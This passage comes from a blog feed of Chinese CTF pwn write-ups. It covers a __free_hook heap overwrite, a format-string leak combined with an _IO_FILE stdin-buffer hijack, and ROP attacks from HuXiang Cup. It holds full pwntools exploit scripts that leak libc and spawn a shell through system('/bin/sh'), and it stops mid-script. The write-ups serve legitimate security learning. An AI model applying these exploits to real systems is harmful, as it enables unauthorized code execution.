number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># New(str(5),str(0x68))</span><span class="token comment" spellcheck="true"># New(str(6),str(0x68))</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Delete(str(5))</span><span class="token comment" spellcheck="true"># print(hex(libc.symbols["__malloc_hook"]))</span><span class="token comment" spellcheck="true">#0x354b78</span>Edit<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># debug([0x203320])</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(hex(libc.sym["realloc"]))</span>Edit<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p64(libc.symbols["__malloc_hook"]-0x3eb000-8+13)+"\n")</span><span class="token comment" spellcheck="true"># New(str(6),str(0x68))</span>Edit<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00\n"</span><span class="token punctuation">)</span>debug<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x203320</span><span class="token punctuation">]</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>__isoc99_scanf   调用_IO_vfscanf_internal 调用__GI__IO_default_uflow 调用_IO_new_file_underflow</p><pre class=" language-c++"><code class="language-c++">int_IO_new_file_underflow (FILE *fp){  ssize_t count;  /* C99 requires EOF to be "sticky".  */  if (fp->_flags & _IO_EOF_SEEN)    return EOF;  if (fp->_flags & _IO_NO_READS)    {      fp->_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    }  if (fp->_IO_read_ptr < fp->_IO_read_end)   //检查:_IO_read_ptr要比_IO_read_end大    return *(unsigned char *) fp->_IO_read_ptr;  if (fp->_IO_buf_base == NULL)//缓冲区为空分配空间    {      /* Maybe we already have a push back pointer.  */      if (fp->_IO_save_base != NULL)        {          free (fp->_IO_save_base);          fp->_flags &= ~_IO_IN_BACKUP;        }      _IO_doallocbuf (fp);    }  /* FIXME This can/should be moved to genops ?? */  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))    {      /* We used to flush all line-buffered stream.  This really isn't         required by any standard.  My recollection is that         traditional Unix systems did this for stdout.  stderr better         not be line buffered.  So we do just that here         explicitly.  --drepper */      _IO_acquire_lock (stdout);      if ((stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))          == (_IO_LINKED | _IO_LINE_BUF))        _IO_OVERFLOW (stdout, EOF);      _IO_release_lock (stdout);    }  _IO_switch_to_get_mode (fp);  /* This is very tricky. We have to adjust those     pointers before we call _IO_SYSREAD () since     we may longjump () out while waiting for     input. Those pointers may be screwed up. H.J. */  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;  fp->_IO_read_end = fp->_IO_buf_base;  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end    = fp->_IO_buf_base;  count = _IO_SYSREAD (fp, fp->_IO_buf_base,                       fp->_IO_buf_end - fp->_IO_buf_base);//向_IO_buf_base处写入数据,读取的实际长度是_IO_buf_end -_IO_buf_base  if (count <= 0)    {      if (count == 0)        fp->_flags |= _IO_EOF_SEEN;      else        fp->_flags |= _IO_ERR_SEEN, count = 0;  }  fp->_IO_read_end += count;//读取结束后_IO_read_end加上读取的长度  if (count == 0)    {      /* If a stream is read to EOF, the calling application may switch active         handles.  As a result, our offset cache would no longer be valid, so         unset it.  */      fp->_offset = _IO_pos_BAD;      return EOF;    }  if (fp->_offset != _IO_pos_BAD)    _IO_pos_adjust (fp->_offset, count);  return *(unsigned char *) fp->_IO_read_ptr;}</code></pre><p>这里是把数据读到缓冲区,read_ptr指针是把数据从缓冲区读到用户空间,所以这里read_ptr指针要比较大</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604907487628.png" alt="指针情况"></p><p>实际IO_file结构在内存中的情况是</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604909452890.png" alt="IO_file结构"></p><h3 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h3><p>泄露libc加载地址。是原始偏移加上栈上的偏移，一般情况下64位程序的原始偏移是6，如题的0xf+6=21，wp里面用%21$p进行泄露.</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604902851396.png" alt="偏移"></p><h3 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流"></a>劫持执行流</h3><ul><li>用格式化字符串漏洞修改栈里面的_IO_file结构</li><li>用scanf函数向修改后的_IO_buf_base结构写入数据修改_IO_buf_base和_IO_buf_end 指针修改为main函数的返回地址(一个栈地址)</li><li>持续的getchar让_IO_read_ptr追上_IO_read_end指针,这样才能再次读入数据</li><li>修改返回地址</li></ul><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x83</span> <span class="token operator">+</span> _IO_2_1_stdin_addr<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_ret <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>echo2<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>debug<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x000000000000106D</span><span class="token punctuation">,</span><span class="token number">0x000000000000FFE</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>完成上面第二步,在标记的地方就是写入数据开始的地方(原来IO_read_base指向的地方)</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604910603484.png" alt="修改后的IO_file"></p><p>但是这时read_ptr指针是小于read_end指针的所以需要调用多次getchar()实际上应该是调用lenpayload次(在发送上面payload的时候已经调用了一次,后面还需要lenpayload-1次)</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./Echo"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./Echo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>libccontext<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token comment" spellcheck="true"># p = remote('121.36.216.253',10001)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     debug_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>         <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"User name:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">echo</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input size:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">echo2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input size:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">get_base</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"say:"</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0xe</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    base<span class="token operator">=</span>info<span class="token operator">-</span>addr    <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span><span class="token number">0x4527a</span><span class="token punctuation">,</span><span class="token number">0xf0364</span><span class="token punctuation">,</span><span class="token number">0xf1207</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#leak</span>echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{}$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>get_base<span class="token punctuation">(</span><span class="token number">0x20840</span><span class="token punctuation">)</span>echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{}$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr<span class="token operator">=</span>get_base<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#栈地址到加载地址的偏移会变</span>echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{}$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x9</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pie_base<span class="token operator">=</span>get_base<span class="token punctuation">(</span><span class="token number">0x1107</span><span class="token punctuation">)</span>io_buffer_base<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdin_"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">7</span>login<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>io_buffer_base<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"io_buffer_base:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>io_buffer_base<span class="token punctuation">)</span><span class="token punctuation">)</span>echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{}$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdin_"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">131</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>echo2<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    echo2<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># debug([0x00000000000106D,0x0000000000000F77])</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>pie_base<span class="token operator">+</span><span class="token number">0x00000000000011b3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>echo2<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># echo2("\n")</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h3><p>实际上这样构造payload的时候(多了个\n),实际上没有\n   scanf函数是能截断的</p><pre class=" language-python"><code class="language-python">payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdin_"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">131</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span></code></pre><p>上面的payload会设置一些指针然后会造成崩溃.</p><h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湖湘杯wp-pwn</title>
      <link href="2020/11/10/%E6%B9%96%E6%B9%98%E6%9D%AFpwn-wp/"/>
      <url>2020/11/10/%E6%B9%96%E6%B9%98%E6%9D%AFpwn-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="pwn1-what-the-f-k-printf"><a href="#pwn1-what-the-f-k-printf" class="headerlink" title="pwn1 what the f**k printf?"></a>pwn1 what the f**k printf?</h2><p>输入16个32能够溢出</p><p>泄露libc   获取shell</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>local<span class="token operator">=</span><span class="token number">1</span>pop_rdi_ret<span class="token operator">=</span><span class="token number">0x0000000000401213</span>valu_addr<span class="token operator">=</span><span class="token number">0x000000000401181</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token comment" spellcheck="true"># pop= int(enhex(asm("pop rdi;ret")),16)</span><span class="token comment" spellcheck="true"># print</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn_printf"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You will find this game very interesting\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(pop)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">50015</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> item <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"32"</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./pwn_printf"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p,"b *0x0000000000401181")</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>valu_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>libc_info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">"\x00\x00"</span>libc_info<span class="token operator">=</span>u64<span class="token punctuation">(</span>libc_info<span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>libc_info<span class="token number">-0x6f6a0</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_info<span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1.直接用call函数不是更好?为什么在call完之后调用</span></code></pre><p>遇到问题:</p><ul><li>原来使用Ubuntu18的环境运行,在第二次拿shell的时候总是失败</li><li>偏移用libc_search搜索出来的,但是还是不准.</li><li>在第二次拿shell的时候可以跳过call,上面的脚本运行了call指令,实际上最好是不用call指令,用了call指令在Ubuntu18环境里可能会出问题,具体原因不知道.</li></ul><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><ul><li>在read的时候有off-by-one</li><li>在show_name的时候有格式化字符串漏洞</li><li>free之后指针没有清零,有doublefree</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604996256058.png" alt="try-catch过程"></p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604996932067.png" alt="函数实现"></p><p>unwind过程完成之后将会运行到程序的空间由用户定义的catch函数进行接下来的操作(注意:在catch之前不能修改返回地址可能会跳不到catch函数),整个过程跳过了canary检测</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604999037533.png" alt="catch函数"></p><p>直接进行了leave,ret跳过了canary的检测</p><p>leave指令进行了</p><pre class=" language-c"><code class="language-c">mov esp<span class="token punctuation">,</span>ebp<span class="token punctuation">;</span>  恢复esp同时回收局部变量空间pop ebp<span class="token punctuation">;</span>          从栈中恢复保存的ebp的值</code></pre><p>再次执行leave,ret指令的时候程序会跳转到ebp+4存放的地址将会是返回地址。</p><p>这里在堆上布置好rop</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>file_path <span class="token operator">=</span> <span class="token string">"./blend_pwn"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x121c)")</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.169'</span><span class="token punctuation">,</span> <span class="token number">57404</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token comment" spellcheck="true"># p=process("./blend_pwn")</span><span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     debug_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 